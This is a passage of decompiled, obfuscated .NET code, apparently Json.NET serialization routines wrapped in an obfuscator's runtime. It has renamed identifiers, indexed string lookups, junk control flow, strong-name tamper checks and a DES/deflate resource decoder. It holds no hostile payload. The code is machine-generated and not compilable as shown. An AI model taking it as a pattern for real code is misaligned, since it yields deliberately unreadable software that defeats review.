      *(int*) voidPtr = *(int*) voidPtr - (*(int*) voidPtr >> 17);
      *(int*) voidPtr = *(int*) voidPtr - (*(int*) voidPtr >> 11);
      *(int*) voidPtr = *(int*) voidPtr - (*(int*) voidPtr >> 5);
      for (\u0008.\u0005.\u0001 obj = obj1.\u0001[*(int*) voidPtr & obj1.\u0003]; obj != null; obj = obj.\u0001)
      {
        if (obj.\u0001 == *(int*) voidPtr && \u0014.\u0006.\u0001(obj0, obj2, obj.\u0001, obj3))
          return obj.\u0001;
      }
      return (string) null;
    }

    static void \u0001([In] object obj0, [In] \u0015.\u0013 obj1)
    {
      if (obj0 == null)
      {
        if (true)
          throw new ArgumentNullException(\u0014.\u0006.\u0082(14866));
      }
      else
        goto label_22;
label_18:
      int index;
      if (index == array.Length)
        Array.Resize<object>(ref array, index * 2);
      else
        goto label_21;
label_20:
      obj1.\u0001 = (object) array;
label_21:
      array[index] = obj0;
      return;
label_22:
      if (obj1.\u0001 == null)
      {
        \u0015.\u0013 obj2 = obj1;
        object obj3;
        if (obj0 is object[])
        {
          obj3 = (object) new object[1];
          obj3[0] = obj0;
        }
        else
          goto label_24;
label_5:
        obj2.\u0001 = obj3;
        return;
label_24:
        obj3 = obj0;
        goto label_5;
      }
      else if (!(obj1.\u0001 is object[] array))
      {
        obj1.\u0001 = (object) new object[2]
        {
          obj1.\u0001,
          obj0
        };
      }
      else
      {
        int num1 = 0;
        if (num1 == 0)
          index = num1;
        else
          goto label_13;
label_12:
        num1 = index;
label_13:
        int num2 = array.Length;
        if (true)
          num2 = num2;
        if (num1 < num2)
        {
          if (true)
          {
            if (array[index] != null)
            {
              int num3 = index;
              int num4;
              while (true)
              {
                num4 = num3 + 1;
                if (false)
                  num3 = num4;
                else
                  break;
              }
              index = num4;
              goto label_12;
            }
            else
              goto label_18;
          }
          else
            goto label_20;
        }
        else
          goto label_18;
      }
    }

    static \u0016.\u0003 \u0001([In] \u0016.\u0001 obj0)
    {
      \u0016.\u0003 obj = new \u0016.\u0003();
      if (obj0 != null)
        \u0014.\u0006.\u0001(obj0, obj);
      return obj;
    }

    static void \u0001(
      [In] \u0010.\u0006 obj0,
      [In] JsonWriter obj1,
      [In] object obj2,
      [In] \u0005.\u0008 obj3,
      [In] JsonProperty obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6)
    {
      if (obj3.\u0001() != \u000F.\u0003.\u008E || !\u0014.\u0006.\u0001(obj0, \u0006.\u0001.\u0002, (\u0016.\u0007) obj3, obj4, obj5, obj6))
      {
        \u0014.\u0006.\u0001(obj1, obj3.\u0001(), obj2);
      }
      else
      {
        obj1.\u0002();
        \u0014.\u0006.\u0001(obj3.\u0002, obj1, obj0);
        obj1.\u0001(\u0014.\u0006.\u0082(7155), false);
        \u0014.\u0006.\u0001(obj1, obj3.\u0001(), obj2);
        obj1.\u0011();
      }
    }

    static double? \u0001([In] \u0015.\u0013 obj0)
    {
      if (obj0 == null)
        return new double?();
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj != null)
      {
        int num = 1;
        if (num != 0)
          num = \u0014.\u0006.\u0001(num != 0, \u0015.\u0013.\u0002, (\u0015.\u0013) obj) ? 1 : 0;
        if (num != 0)
          return obj.\u0001 == null ? new double?() : new double?(Convert.ToDouble(obj.\u0001, (IFormatProvider) CultureInfo.InvariantCulture));
      }
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(14883), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
    }

    static void \u0001([In] string obj0, [In] int obj1, [In] int? obj2, [In] \u0016.\u0011 obj3)
    {
      do
      {
        if (true)
        {
          if (!obj2.HasValue)
            goto label_8;
        }
        else
          goto label_3;
label_2:
        if (true)
        {
          BinaryWriter binaryWriter = obj3.\u0001;
          int valueOrDefault = obj2.GetValueOrDefault();
          if (true)
          {
            binaryWriter.Write(valueOrDefault);
            goto label_8;
          }
          else
            goto label_8;
        }
        else
          goto label_5;
label_3:
        if (true)
          obj3.\u0001.Write((byte) 0);
        else
          goto label_2;
label_5:
        continue;
label_8:
        \u0014.\u0006.\u0001(obj3, obj0, obj1);
        goto label_3;
      }
      while (false);
    }

    static void \u0001([In] char obj0, [In] int obj1, [In] \u0011.\u0003 obj2, [In] int obj3)
    {
      while (true)
      {
        if (obj1 > obj3)
          goto label_7;
label_3:
        if (false)
          break;
        if (true)
        {
          obj2.\u0001.\u0001(obj2.\u0001, obj0);
          break;
        }
        continue;
label_7:
        obj2.\u0001.\u0001(obj2.\u0001, obj2.\u0001, obj3, obj1 - obj3);
        goto label_3;
      }
    }

    static void \u0001([In] int obj0, [In] \u0004.\u0005 obj1, [In] int obj2, [In] char[] obj3) => \u009E.\u007E\u0015\u0004((object) obj1.\u0001, obj3, obj2, obj0);

    static void \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0012.\u0007 obj1,
      [In] JsonProperty obj2,
      [In] Dictionary<JsonProperty, JsonSerializerInternalReader.PropertyPresence> obj3)
    {
      if (obj2 == null || obj3 == null)
        return;
      JsonSerializerInternalReader.PropertyPresence propertyPresence;
      switch (obj1.\u0001())
      {
        case JsonToken.String:
          propertyPresence = \u0014.\u0006.\u0001(obj2.\u0001, obj2.\u0001(), (string) obj1.\u0001()) ? JsonSerializerInternalReader.PropertyPresence.\u0002 : JsonSerializerInternalReader.PropertyPresence.\u0003;
          break;
        case JsonToken.Null:
        case JsonToken.Undefined:
          propertyPresence = JsonSerializerInternalReader.PropertyPresence.\u0002;
          break;
        default:
          propertyPresence = JsonSerializerInternalReader.PropertyPresence.\u0003;
          break;
      }
      obj3[obj2] = propertyPresence;
    }

    static void \u0001([In] object obj0, [In] JsonProperty obj1)
    {
      obj1.\u0001 = true;
      obj1.\u0001 = obj0;
    }

    static void \u0001([In] JsonWriter obj0, [In] \u0012.\u0007 obj1)
    {
      if (!obj1.\u0001())
      {
        if (true)
          throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(14924), (Exception) null);
      }
      else if (obj1.\u0001() == JsonToken.Integer)
      {
        DateTime dateTime = new DateTime((long) obj1.\u0001() * 10000L + \u0004.\u0007.\u0001, DateTimeKind.Utc);
        if (obj1.\u0001())
          goto label_5;
label_3:
        if (true)
          throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(14924), (Exception) null);
        goto label_8;
label_5:
        if (obj1.\u0001() != JsonToken.EndConstructor)
        {
          if (true)
            throw \u0014.\u0006.\u0001(obj0, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(15082), (object) obj1.\u0001()), (Exception) null);
          goto label_3;
        }
label_8:
        obj0.\u0001(dateTime);
        return;
      }
      throw \u0014.\u0006.\u0001(obj0, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(14985), (object) obj1.\u0001()), (Exception) null);
    }

    static bool \u0001([In] \u000E.\u000E obj0, [In] \u0004.\u0011 obj1)
    {
      while (true)
      {
        \u0015.\u0013 obj = ((\u0015.\u0013) obj1).\u0002();
        if (true)
          goto label_7;
label_4:
        obj0.\u0002 = (\u0015.\u0013) obj1;
        break;
label_7:
        if (obj == null)
          return \u0014.\u0006.\u0001(obj0, obj1);
        \u0014.\u0006.\u0001(obj0, obj);
        if (true)
        {
          obj0.\u0003 = obj;
          goto label_4;
        }
      }
      int num = 1;
      return num == 0 ? num != 0 : num != 0;
    }

    static bool \u0001([In] \u0006.\u0005 obj0, [In] \u0006.\u0005 obj1)
    {
      if (obj0 == obj1)
        return true;
      if (obj0.\u0001 != obj1.\u0001)
        return false;
      int num = \u0006.\u0005.\u0001(obj0.\u0001, obj0.\u0001, obj1.\u0001);
      if (false)
        return num != 0;
      if (false)
        return num != 0;
      return num == 0;
    }

    static bool \u0001([In] \u0011.\u0003 obj0, [In] string obj1)
    {
label_0:
      if (!\u0014.\u0006.\u0001(obj1, obj0))
        return false;
      while (\u0014.\u0006.\u0001(obj0, 0, false))
      {
        if (!\u0014.\u0006.\u0001(obj0, obj0.\u0001[obj0.\u0002]))
        {
          if (true)
          {
            if (true)
            {
              int num = obj0.\u0001[obj0.\u0002] == char.MinValue ? 1 : 0;
              return false ? num != 0 : num != 0;
            }
          }
          else
            goto label_0;
        }
        else if (true)
          return true;
      }
      return true;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001(
      [In] \u0010.\u0006 obj0,
      [In] JsonWriter obj1,
      [In] Array obj2,
      [In] \u0001.\u0007 obj3,
      [In] JsonProperty obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6)
    {
      \u0010.\u0006 obj7 = obj0;
      JsonWriter jsonWriter = obj1;
      \u0001.\u0007 obj8 = obj3;
      Array array = obj2;
      if (true)
        \u0014.\u0006.\u0001(obj7, jsonWriter, (\u0016.\u0007) obj8, (object) array);
      obj0.\u0001.Add((object) obj2);
      int num = \u0014.\u0006.\u0001(obj6, (object) obj2, obj3, obj4, obj1, obj5, obj0) ? 1 : 0;
      \u0014.\u0006.\u0001(obj0, obj1, obj2, obj3, obj4, \u0014.\u0006.\u0001(obj1), new int[0]);
      if (num != 0)
        obj1.\u0011();
      obj0.\u0001.RemoveAt(obj0.\u0001.Count - 1);
      \u0014.\u0006.\u0001(obj1, obj0, (object) obj2, (\u0016.\u0007) obj3);
    }

    static void \u0001([In] \u001B obj0, [In] string obj1, [In] string obj2)
    {
      if (false)
        goto label_7;
      else
        goto label_5;
label_1:
      if (true)
      {
        obj0.\u0002(JsonToken.Undefined);
        goto label_7;
      }
label_3:
      if (true)
      {
        if (true)
          return;
        goto label_1;
      }
      else
        goto label_7;
label_5:
      \u0014.\u0006.\u0001((object) obj1, \u0014.\u0006.\u0082(15187));
      \u0014.\u0006.\u0001((JsonWriter) obj0);
      goto label_1;
label_7:
      \u0014.\u0006.\u0001(obj0, (\u0013.\u0007) new \u0011.\u000F(obj1, obj2));
      goto label_3;
    }

    static bool \u0001(
      JsonSerializerInternalReader _param0,
      \u000E.\u000E _param1,
      ref System.Type _param2,
      ref \u0016.\u0007 _param3,
      JsonProperty _param4,
      \u0006.\u0002 _param5,
      JsonProperty _param6,
      [Out] object _param7,
      out object _param8,
      [In] ref string obj9)
    {
label_0:
      obj9 = (string) null;
      _param8 = (object) null;
      if (_param1.\u0001() == JsonToken.StartObject)
        goto label_31;
label_30:
      \u0014.\u0006.\u0001((\u0012.\u0007) _param1);
      return false;
label_31:
      \u0012.\u0015 obj1 = (\u0012.\u0015) _param1.\u0003;
      \u0015.\u0013 obj2 = obj1[\u0014.\u0006.\u0082(9520)];
      \u0015.\u0013 obj3;
      \u0015.\u0013 obj4;
      if (obj2 != null)
      {
        obj3 = obj2.\u0001() == JTokenType.String || obj2.\u0001() == JTokenType.Null ? (\u0015.\u0013) obj2.\u0001() : throw \u0014.\u0006.\u0001((\u000F.\u0001) obj2, \u0014.\u0006.\u0001(obj2), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9529), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0082(9520)), (Exception) null);
        obj4 = (\u0015.\u0013) null;
        if (obj3.\u0002 != null)
        {
          obj4 = obj3.\u0002;
          goto label_8;
        }
      }
      else
        goto label_18;
label_5:
      if (obj3.\u0001 != null)
      {
        if (true)
          obj4 = obj3.\u0001;
        else
          goto label_25;
      }
label_8:
      string str1 = \u0014.\u0006.\u0001(obj2);
      while (str1 != null)
      {
        if (obj4 != null)
          throw \u0014.\u0006.\u0001((\u000F.\u0001) obj4, \u0014.\u0006.\u0001(obj4), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9614), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0082(9520)), (Exception) null);
        _param8 = \u0014.\u0006.\u0001(_param0.\u0001).\u0001((object) _param0, str1);
        if (true)
        {
          if (_param0.\u0001 != null && _param0.\u0001.\u0001() >= TraceLevel.Info)
            _param0.\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001((\u000F.\u0001) _param1, _param1.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9760), (IFormatProvider) \u0098.\u0002\u0004(), (object) str1, (object) \u0001\u0002.\u007E\u0017\u0004(_param8))), (Exception) null);
          if (true)
            \u0014.\u0006.\u0001((\u0012.\u0007) _param1);
          else
            continue;
        }
        return true;
      }
label_18:
      \u0015.\u0013 obj5 = obj1[\u0014.\u0006.\u0082(9813)];
      if (obj5 != null)
      {
        string str2 = \u0014.\u0006.\u0001(obj5);
        \u0012.\u0007 obj6 = \u0014.\u0006.\u0001(obj5);
        if (true)
        {
          \u0014.\u0006.\u0001(obj6);
          \u0014.\u0006.\u0001(str2, _param4, _param0, ref _param2, ref _param3, _param5, _param6, obj6);
          if (obj1[\u0014.\u0006.\u0082(7155)] != null)
            goto label_21;
        }
        else
          goto label_0;
      }
      \u0015.\u0013 obj7 = obj1[\u0014.\u0006.\u0082(9822)];
      if (obj7 == null)
        goto label_26;
      else
        goto label_25;
label_21:
      \u0014.\u0006.\u0001((\u0012.\u0007) _param1);
      if (_param1.\u0001() == JsonToken.PropertyName && \u0007\u0002.\u008C\u0004((string) _param1.\u0001(), \u0014.\u0006.\u0082(7155)))
        return false;
label_23:
      \u0014.\u0006.\u0001((\u0012.\u0007) _param1);
      \u0014.\u0006.\u0001((\u0012.\u0007) _param1);
      goto label_21;
label_25:
      obj9 = \u0014.\u0006.\u0001(obj7);
label_26:
      if (true)
      {
        \u0015.\u0013 obj8 = obj1[\u0014.\u0006.\u0082(9827)];
        if (true)
        {
          if (obj8 != null)
          {
            \u0012.\u0007 obj10 = \u0014.\u0006.\u0001(obj8);
            \u0014.\u0006.\u0001(obj10);
            _param8 = \u0014.\u0006.\u0001(_param0, obj10, _param2, _param3, _param4, _param7, obj9);
            \u0014.\u0006.\u0001((\u0012.\u0007) _param1);
            return true;
          }
          goto label_30;
        }
        else
          goto label_23;
      }
      else
        goto label_5;
    }

    static void \u0001([In] \u0004.\u0011 obj0) => obj0.\u0001();

    static System.Type \u0001([In] \u0013.\u0004.\u0001 obj0)
    {
      string str1 = obj0.\u0001;
      string str2 = obj0.\u0002;
      switch (str1)
      {
        case null:
          return \u009A\u0003.\u008C\u0007(str2);
        default:
          Assembly assembly1 = \u0096\u0003.\u0088\u0007(str1);
          do
          {
            if ((object) assembly1 == null)
            {
              Assembly[] assemblyArray = \u0098\u0003.\u007E\u008A\u0007((object) \u0097\u0003.\u0089\u0007());
              int index = 0;
              Assembly assembly2;
              while (true)
              {
                int num1 = index;
                int num2 = assemblyArray.Length;
                int num3;
                int num4;
                while (true)
                {
                  int num5 = num2;
                  if (num1 < num5)
                  {
                    assembly2 = assemblyArray[index];
                    if (!\u0007\u0002.\u008C\u0004(global::\u0001.\u007E\u0003((object) assembly2), str1))
                    {
                      num3 = index;
                      num4 = 1;
                      if (num4 == 0)
                      {
                        num2 = num4;
                        num1 = num3;
                      }
                      else
                        break;
                    }
                    else
                      goto label_6;
                  }
                  else
                    goto label_12;
                }
                index = num3 + num4;
              }
label_6:
              if (true)
                assembly1 = assembly2;
              else
                goto label_14;
            }
label_12:;
          }
          while (false);
          if ((object) assembly1 != null)
            return \u0099\u0003.\u007E\u008B\u0007((object) assembly1, str2) ?? throw new JsonSerializationException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(15241), (IFormatProvider) \u0098.\u0002\u0004(), (object) str2, (object) global::\u0001.\u007E\u0003((object) assembly1)));
label_14:
          throw new JsonSerializationException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(15200), (IFormatProvider) \u0098.\u0002\u0004(), (object) str1));
      }
    }

    static \u0015.\u0013 \u0001([In] \u0012.\u0007 obj0) => \u0014.\u0006.\u0001(obj0, (\u000F.\u0007) null);

    static JsonToken \u0001([In] \u0012.\u0007 obj0)
    {
      JsonToken jsonToken;
      do
      {
        do
        {
          int num = obj0.\u0001() ? 1 : 0;
          if (false)
            return (JsonToken) num;
          if (false)
            return (JsonToken) num;
          if (num != 0)
          {
            if (false)
              goto label_9;
          }
          else
            goto label_7;
        }
        while (false);
        goto label_8;
label_7:
        \u0014.\u0006.\u0001(obj0, JsonToken.None);
        return JsonToken.None;
label_8:
        jsonToken = obj0.\u0001();
      }
      while (jsonToken == JsonToken.Comment);
label_9:
      return jsonToken;
    }

    static void \u0001([In] JsonProperty obj0, [In] JsonWriter obj1)
    {
      if (false)
        return;
      if (obj0.\u0003)
        obj1.\u0001(obj0.\u0001, false);
      else
        obj1.\u0002(obj0.\u0001);
    }

    static JsonSerializationException \u0001(
      [In] string obj0,
      [In] Exception obj1,
      [In] \u0012.\u0007 obj2)
    {
      return \u0014.\u0006.\u0001(obj2 as \u000F.\u0001, obj2.\u0001(), obj0, obj1);
    }

    static string \u0001([In] \u0002.\u0003 obj0) => obj0.\u0001;

    static unsafe string \u0001([In] \u0008.\u0005 obj0, [In] string obj1)
    {
      int num1 = 12;
      void* voidPtr;
      \u0008.\u0005.\u0001 obj;
      if (num1 != 0)
      {
        // ISSUE: untyped stack allocation
        IntPtr num2 = __untypedstackalloc(num1);
        if (true)
          voidPtr = (void*) num2;
        switch (obj1)
        {
          case null:
            throw new ArgumentNullException(\u0014.\u0006.\u0082(6721));
          default:
            *(int*) voidPtr = \u001F.\u007E\u0011\u0003((object) obj1);
            if (*(int*) voidPtr == 0)
              return string.Empty;
            if (false)
              goto label_8;
            else
              goto label_20;
label_5:
            *(int*) ((IntPtr) voidPtr + 8) = 0;
label_8:
            while (*(int*) ((IntPtr) voidPtr + 8) < \u001F.\u007E\u0011\u0003((object) obj1))
            {
              *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + (*(int*) ((IntPtr) voidPtr + 4) << 7 ^ (int) \u001B\u0002.\u007E\u0088\u0005((object) obj1, *(int*) ((IntPtr) voidPtr + 8)));
              if (true)
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              else
                goto label_5;
            }
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - (*(int*) ((IntPtr) voidPtr + 4) >> 17);
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - (*(int*) ((IntPtr) voidPtr + 4) >> 11);
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - (*(int*) ((IntPtr) voidPtr + 4) >> 5);
            obj = obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4) & obj0.\u0003];
            goto label_15;
label_20:
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr + \u0008.\u0005.\u0001;
            goto label_5;
        }
      }
label_12:
      if (num1 != 0)
        return obj.\u0001;
label_14:
      obj = obj.\u0001;
label_15:
      if (obj == null)
        return \u0014.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 4), obj0, obj1);
      if (obj.\u0001 == *(int*) ((IntPtr) voidPtr + 4))
      {
        num1 = global::\u0014.\u007E\u008E\u0002((object) obj.\u0001, obj1) ? 1 : 0;
        goto label_12;
      }
      else
        goto label_14;
    }

    static bool \u0001([In] System.Type obj0)
    {
      \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(4722));
      // ISSUE: type reference
      int num1 = \u0093\u0002.\u007E\u0012\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (IDictionary)), obj0) ? 1 : 0;
label_2:
      if (num1 == 0)
        goto label_12;
label_3:
      if (true)
        return true;
label_7:
      if (true)
      {
        int num2 = 1;
        return num2 == 0 ? num2 != 0 : num2 != 0;
      }
      goto label_3;
label_12:
      // ISSUE: type reference
      while (!\u0014.\u0006.\u0001(obj0, \u0004\u0002.\u0084\u0004(__typeref (IDictionary<,>))))
      {
        if (true)
        {
          int num3 = 0;
          if (num3 == 0)
            return num3 != 0;
          num1 = num3;
          goto label_2;
        }
      }
      goto label_7;
    }

    static bool \u0001([In] MemberInfo obj0)
    {
      PropertyInfo propertyInfo;
      do
      {
        \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(8901));
        propertyInfo = obj0 as PropertyInfo;
      }
      while (false);
      if ((object) propertyInfo == null)
        goto label_4;
      else
        goto label_7;
label_2:
      int num;
      if (true)
        return num != 0;
      goto label_5;
label_4:
      num = 0;
label_5:
      if (num == 0 && num == 0)
        return num != 0;
      goto label_2;
label_7:
      num = \u0014.\u0006.\u0001(propertyInfo) ? 1 : 0;
      goto label_2;
    }

    static System.Type \u0001([In] System.Type obj0) => \u0014.\u0006.\u0001(obj0) ? \u0099\u0002.\u001F\u0006(obj0) : obj0;

    static ICryptoTransform \u0001([In] byte[] obj0, [In] byte[] obj1, [In] bool obj2)
    {
      ICryptoTransform cryptoTransform1;
      using (DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider())
      {
        ICryptoTransform cryptoTransform2;
        while (!obj2)
        {
          if (true)
          {
            cryptoTransform2 = cryptoServiceProvider.CreateEncryptor(obj1, obj0);
            goto label_3;
          }
        }
        goto label_5;
label_3:
        cryptoTransform1 = cryptoTransform2;
        if (true)
          goto label_9;
label_5:
        cryptoTransform2 = cryptoServiceProvider.CreateDecryptor(obj1, obj0);
        goto label_3;
      }
label_9:
      return cryptoTransform1;
    }

    static unsafe Dictionary<string, string> \u0001(
      [In] XmlNodeConverter obj0,
      [In] \u0012.\u0007 obj1,
      [In] XmlNamespaceManager obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(2);
      Dictionary<string, string> dictionary = new Dictionary<string, string>();
      *(sbyte*) voidPtr = (sbyte) 0;
      *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 0;
      if (obj1.\u0001() != JsonToken.String && obj1.\u0001() != JsonToken.Null && obj1.\u0001() != JsonToken.Boolean && obj1.\u0001() != JsonToken.Integer && obj1.\u0001() != JsonToken.Float && obj1.\u0001() != JsonToken.Date && obj1.\u0001() != JsonToken.StartConstructor)
      {
        while (*(sbyte*) voidPtr == (sbyte) 0 && *(sbyte*) ((IntPtr) voidPtr + 1) == (sbyte) 0 && obj1.\u0001())
        {
          switch (obj1.\u0001())
          {
            case JsonToken.PropertyName:
              string str1 = obj1.\u0001().ToString();
              if (!string.IsNullOrEmpty(str1))
              {
                switch (str1[0])
                {
                  case '$':
                    string prefix1 = obj2.LookupPrefix(\u0014.\u0006.\u0082(9935));
                    if (prefix1 == null)
                    {
                      int? nullable = new int?();
                      while (obj2.LookupNamespace(\u0014.\u0006.\u0082(15302) + (object) nullable) != null)
                        nullable = new int?(nullable.GetValueOrDefault() + 1);
                      prefix1 = \u0014.\u0006.\u0082(15302) + (object) nullable;
                      dictionary.Add(\u0014.\u0006.\u0082(15311) + prefix1, \u0014.\u0006.\u0082(9935));
                      obj2.AddNamespace(prefix1, \u0014.\u0006.\u0082(9935));
                    }
                    if (str1 == \u0014.\u0006.\u0082(9827))
                    {
                      *(sbyte*) voidPtr = (sbyte) 1;
                      continue;
                    }
                    string str2 = str1.Substring(1);
                    obj1.\u0001();
                    if (!\u0014.\u0006.\u0001(obj1.\u0001()))
                      throw \u0014.\u0006.\u0001(obj1, \u0014.\u0006.\u0082(15320) + (object) obj1.\u0001());
                    string str3 = obj1.\u0001() != null ? obj1.\u0001().ToString() : (string) null;
                    dictionary.Add(prefix1 + \u0014.\u0006.\u0082(3197) + str2, str3);
                    continue;
                  case '@':
                    string key = str1.Substring(1);
                    obj1.\u0001();
                    string uri = \u0014.\u0006.\u0001(obj0, obj1);
                    dictionary.Add(key, uri);
                    string prefix2;
                    if (\u0014.\u0006.\u0001(ref prefix2, key, obj0))
                    {
                      obj2.AddNamespace(prefix2, uri);
                      continue;
                    }
                    continue;
                  default:
                    *(sbyte*) voidPtr = (sbyte) 1;
                    continue;
                }
              }
              else
              {
                *(sbyte*) voidPtr = (sbyte) 1;
                continue;
              }
            case JsonToken.Comment:
              *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 1;
              continue;
            case JsonToken.EndObject:
              *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 1;
              continue;
            default:
              throw \u0014.\u0006.\u0001(obj1, \u0014.\u0006.\u0082(15320) + (object) obj1.\u0001());
          }
        }
      }
      return dictionary;
    }

    static ConstructorInfo \u0001([In] System.Type obj0) => \u0014.\u0006.\u0001(obj0, false);

    static int? \u0001([In] \u0012.\u0007 obj0, [In] string obj1)
    {
      if (!string.IsNullOrEmpty(obj1))
        goto label_5;
label_4:
      \u0014.\u0006.\u0001(obj0, JsonToken.Null, (object) null, false);
      return new int?();
label_5:
      int result;
      if (int.TryParse(obj1, NumberStyles.Integer, (IFormatProvider) \u0014.\u0006.\u0001(obj0), out result))
      {
        \u0014.\u0006.\u0001(obj0, JsonToken.Integer, (object) result, false);
        return new int?(result);
      }
      if (true)
      {
        \u0014.\u0006.\u0001(obj0, JsonToken.String, (object) obj1, false);
        throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(15353), (IFormatProvider) CultureInfo.InvariantCulture, (object) obj1));
      }
      goto label_4;
    }

    static bool \u0001([In] \u0001.\u0007 obj0)
    {
label_0:
      while (!obj0.\u0005())
      {
        do
        {
          if (true)
          {
            if (obj0.\u0002 != null)
              goto label_3;
          }
          else
            goto label_0;
        }
        while (false);
        return obj0.\u0001 != null;
      }
label_3:
      return true;
    }

    static void \u0001([In] \u0011.\u0008 obj0, [In] ConstructorInfo obj1)
    {
      obj0.\u0001 = obj1;
      obj0.\u0002 = (object) obj1 != null ? \u0014.\u0006.\u0001().\u0001((MethodBase) obj1) : (\u0004.\u000F<object>) null;
    }

    static \u0004.\u000F<object> \u0001([In] \u0003.\u0006 obj0)
    {
      if (obj0.\u0003 == null)
        obj0.\u0003 = \u0014.\u0006.\u0001().\u0001((MethodBase) obj0.\u0001);
      return obj0.\u0003;
    }

    static bool \u0001(
      [In] \u0012.\u0007 obj0,
      [In] object obj1,
      [In] JsonProperty obj2,
      [In] JsonSerializerInternalReader obj3)
    {
      if (obj2.\u0002() == null)
        return true;
      if (true)
        goto label_5;
label_4:
      bool flag;
      return flag;
label_5:
      flag = obj2.\u0002()(obj1);
      if (obj3.\u0001 != null && obj3.\u0001.\u0001() >= TraceLevel.Verbose)
      {
        obj3.\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001((\u000F.\u0001) null, obj0.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(15410), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj2.\u0001, (object) obj2.\u0001(), (object) flag)), (Exception) null);
        goto label_4;
      }
      else
        goto label_4;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static \u000E.\u0006 \u0001([In] \u0001.\u0007 obj0, [In] object obj1)
    {
label_0:
      if (obj0.\u0001 != null)
        goto label_7;
      else
        goto label_9;
label_1:
      System.Type type1;
      System.Type type2;
      // ISSUE: type reference
      // ISSUE: type reference
      if (\u0014.\u0006.\u0001(\u0004\u0002.\u0084\u0004(__typeref (List<>)), type1) || (object) \u0001\u0002.\u007E\u001E\u0004((object) obj0.\u0002) == (object) \u0004\u0002.\u0084\u0004(__typeref (IEnumerable<>)))
      {
        // ISSUE: type reference
        type2 = \u0092\u0002.\u007E\u0011\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (ICollection<>)), new System.Type[1]
        {
          obj0.\u0001()
        });
        goto label_6;
      }
label_3:
      if (true)
      {
        if (true)
          type2 = obj0.\u0002;
        else
          goto label_0;
      }
      else
        goto label_1;
label_6:
      ConstructorInfo constructorInfo = \u0012\u0002.\u007E\u0093\u0004((object) obj0.\u0003, new System.Type[1]
      {
        type2
      });
      obj0.\u0001 = \u0014.\u0006.\u0001().\u0001((MethodBase) constructorInfo);
label_7:
      if (true)
        return (\u000E.\u0006) obj0.\u0001(new object[1]
        {
          obj1
        });
      goto label_3;
label_9:
      // ISSUE: type reference
      obj0.\u0003 = \u0092\u0002.\u007E\u0011\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (\u000E.\u0007<>)), new System.Type[1]
      {
        obj0.\u0001()
      });
      type1 = obj0.\u0002;
      goto label_1;
    }

    static Stream \u0001([In] string obj0)
    {
      Assembly assembly = global::\u0013.\u008B\u0002();
      while (!global::\u0014.\u007E\u008C\u0002((object) obj0, \u0014.\u0006.\u0082(15487)))
      {
        if (true)
          return \u009B\u0003.\u007E\u008D\u0007((object) assembly, obj0);
      }
      Stream stream = \u009B\u0003.\u007E\u008D\u0007((object) assembly, obj0);
      try
      {
        DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
        try
        {
          MemoryStream memoryStream = new MemoryStream();
